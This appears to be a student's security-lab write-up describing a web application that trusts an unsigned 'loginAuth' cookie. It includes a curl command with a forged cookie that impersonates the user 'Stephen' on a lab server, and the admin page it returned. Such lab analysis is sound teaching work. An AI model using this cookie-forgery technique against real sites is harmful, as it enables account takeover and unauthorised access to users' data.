After performing some registrations and logins using the system, I discovered
that the only basis on which the page determines if a user is logged in is using
the cookie "loginAuth". The cookie isn't signed so it's quite easy to forge a
fake cookie by substituting my own user for the user "Stephen".

Doing this through cURL produces:

student@xenial64s:~$ curl -k https://192.168.16.1/private/admin.php -H "Cookie: PHPSESSID=a; loginAuth=Stephen2017-10-30T17%3A39%3A23Z"
<!doctype html>
<head>
	<title>Admin</title>
</head>
<body>
<p><strong>Welcome back, Stephen!</strong></p><p>You have <strong>5</strong> new messages.</p><ul>
		<li><strong>Richard Stallman</strong> - Subj: Stuck on HA2 problem 3</li>
		<li><strong>Patrick Bateman</strong>  - Subj: Re: Did you return the textbook?</li>
		<li><strong>Lil Wayne</strong>        - Subj: Recommendation on papers?</li>
		<li><strong>Se Eun Oh</strong>   - Subj: Delay on grading HA2</li>
		<li><strong>Jack Handey</strong> - Subj: Happy Thanksgiving!</li>
    </ul><img src="../img/hacking.gif"></body> </html>


